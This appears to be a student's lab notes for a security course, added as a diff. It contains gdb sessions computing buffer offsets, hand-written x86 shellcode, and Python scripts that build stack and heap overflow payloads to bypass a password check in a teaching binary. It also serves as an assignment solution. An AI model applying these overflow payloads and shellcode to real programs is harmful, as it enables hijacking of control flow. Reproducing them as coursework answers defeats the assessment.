@@ -1,0 +1,198 @@
+gef➤  p &username
+$2 = (char (*)[50]) 0xffffca46
+gef➤  p $ebp
+$3 = (void *) 0xffffca88
+gef➤  p (void *)$ebp +4 - (void *) &username
+$4 = 0x46
+gef➤  p/d (void *)$ebp +4 - (void *) &username
+$5 = 70
+gef➤  p $ebp + 8
+$6 = (void *) 0xffffca90
+gef➤  p inside_dark_web
+$7 = {void (int, int)} 0x5655628d <inside_dark_web>
+
+gef➤  p $ebp + 8
+$1 = (void *) 0xffffca94
+gef➤  p (void *) $ebp + 4 - (void *) &buffer
+$2 = 0x2a
+gef➤  p/d (void *) $ebp + 4 - (void *) &buffer
+$3 = 42
+
+gef➤  p get_service
+$11 = {void (char *, char *)} 0x56556315 <get_service>
+
+
+gef➤  p &(service->execute)
+$5 = (void (**)(char *, char *)) 0x5655c850
+gef➤  p &(user->pass)
+$6 = (char (*)[30]) 0x5655c860
+gef➤  p (void *)&(service->execute) - (void *)&(user->pass)
+$7 = 0xfffffff0
+gef➤  p/d (void *)&(service->execute) - (void *)&(user->pass)
+$8 = -16
+gef➤  p/d (void *)&(user->pass)-(void *)&(service->execute)
+$9 = 16
+gef➤  p inside_dark_web
+$10 = {void (int, int)} 0x5655628d <inside_dark_web>
+
+
+[16 NOPs, then 0x5655628d address]
+
+Outside Address = 0xffffca88 - 0x30 = 0xffffca58
+
+
+
+shell script to run:
+
+xor eax, eax
+inc eax
+inc eax
+inc eax
+inc eax
+push eax
+mov eax, 134774920
+push eax
+mov ebx, 0x5655628d
+call ebx
+
+"\x31\xC0\x40\x40\x40\x40\x50\xB8\x88\x80\x08\x08\x50\xBB\x8D\x62\x55\x56\xFF\xD3"
+
+"\x6A\x04\x68\x88\x80\x08\x08\xBB\xED\x61\x55\x56\xFF\xD3"
+
+
+gef➤  x/50x $esp-100
+0xffffc96c:     0x19999999      0x00000000      0xf7f3e380      0xf7f3da80
+0xffffc97c:     0xf7fb3000      0x0005001e      0x00000000      0x5655c860
+0xffffc98c:     0xffffffff      0x00000000      0x00001000      0x00000002
+0xffffc99c:     0x56558fc0      0xf7fb3000      0xf7fb3000      0xffffca28
+0xffffc9ac:     0xf7e0041d      0x5655c860      0x00000000      0x0000000a
+0xffffc9bc:     0x00000000      0xf7fb3be0      0x5655b840      0x00001000
+0xffffc9cc:     0x56556325      0x5655a6f0      0xf7fb1960      0xf7e003f9
+0xffffc9dc:     0xf7dfc574      0x5655c860      0x00000000      0x0000000a
+0xffffc9ec:     0x00000000      0x00000000      0x56558fc0      0xffffca28
+0xffffc9fc:     0x56556393      0xffffca46      0x5655c860      0xf7fb3000
+0xffffca0c:     0x56556365      0x5655a6f0      0x5655b840      0x00000036
+0xffffca1c:     0x0000138c      0xf7fb3000      0x56558fc0      0xffffca88
+0xffffca2c:     0x56556427      0xffffca46
+
+
+task-1:
+
+#!/usr/bin/env python3
+"""
+TASK 1: Bypass Password Check - SIMPLE VERSION
+===============================================
+
+Fill in the 3 addresses from gdb, then run this script.
+"""
+
+import struct
+
+# STEP 1: Run these commands in gdb and fill in the values:
+#
+#   gdb ./A1
+#   gef➤ b execute
+#   gef➤ r
+#   gef➤ p &username
+#   gef➤ p &service  
+#   gef➤ p get_service
+#
+# Then put the values here:
+
+USERNAME_ADDR = 0xffffca46      # <-- REPLACE with p &username
+SERVICE_ADDR = 0xffffca7c       # <-- REPLACE with p &service
+GET_SERVICE = 0x56556315        # <-- REPLACE with p get_service
+
+# STEP 2: Run this script
+#   python3 task1.py
+#   ./A1
+
+# ============================================
+# DON'T CHANGE ANYTHING BELOW
+# ============================================
+
+if USERNAME_ADDR == 0x0 or SERVICE_ADDR == 0x0 or GET_SERVICE == 0x0:
+    print("ERROR: You need to fill in the addresses from gdb first!")
+    print()
+    print("Run these commands in gdb:")
+    print("  gdb ./A1")
+    print("  gef➤ b execute")
+    print("  gef➤ r")
+    print("  gef➤ p &username")
+    print("  gef➤ p &service")
+    print("  gef➤ p get_service")
+    print()
+    print("Then edit this file and put those values in USERNAME_ADDR, SERVICE_ADDR, GET_SERVICE")
+    exit(1)
+
+# Calculate how many bytes from username start to service pointer
+offset = SERVICE_ADDR - USERNAME_ADDR
+print(f"Offset: {offset} bytes")
+
+# Build the payload
+payload = b''
+
+# First 4 bytes: fake Service struct (contains address of get_service)
+payload += struct.pack('<I', GET_SERVICE)
+
+# Fill from byte 4 to the service pointer
+payload += b'A' * (offset - 4)
+
+# Overwrite service pointer to point to our fake struct (at username[0])
+payload += struct.pack('<I', USERNAME_ADDR)
+
+# Overwrite user pointer (doesn't matter what, just needs to be valid-ish)
+payload += struct.pack('<I', USERNAME_ADDR)
+
+# Overwrite saved ebp and return address (doesn't matter for Task 1)
+payload += b'BBBB'  # saved ebp
+payload += b'CCCC'  # return address
+
+print(f"Payload length: {len(payload)} bytes")
+
+# Write files
+with open('username', 'wb') as f:
+    f.write(payload)
+
+with open('password', 'wb') as f:
+    f.write(b'wrongpassword')
+
+print("[+] Done! Run: ./A1")
+print("[+] You should see: 'Service running on!'")
+
+
+gef➤  p &username
+$1 = (char (*)[50]) 0xffffca46
+gef➤  p &service
+$2 = (Service **) 0xffffca7c
+gef➤  p get_service
+$3 = {void (char *, char *)} 0x56556315 <get_service>
+gef➤
+
+
+#!/usr/bin/env python3
+import struct
+
+GET_SERVICE = 0x56556315  # from your gdb
+
+# Fill 66 bytes to reach return address, then overwrite with &get_service
+payload = b'A' * 70 + struct.pack('<I', GET_SERVICE) + b'\x00'
+
+with open('username', 'wb') as f:
+    f.write(payload)
+
+with open('password', 'wb') as f:
+    f.write(b'wrongpassword')  # can be anything!
+
+print("[+] Done! Run: ./A1")
+
+
+
+gef➤  p get_service
+$1 = {void (char *, char *)} 0x56556315 <get_service>
+gef➤  p (void *) $ebp + 4 - (void *) &username
+$2 = 0x46
+gef➤  p/d (void *) $ebp + 4 - (void *) &username
+$3 = 70
+gef➤  q
+
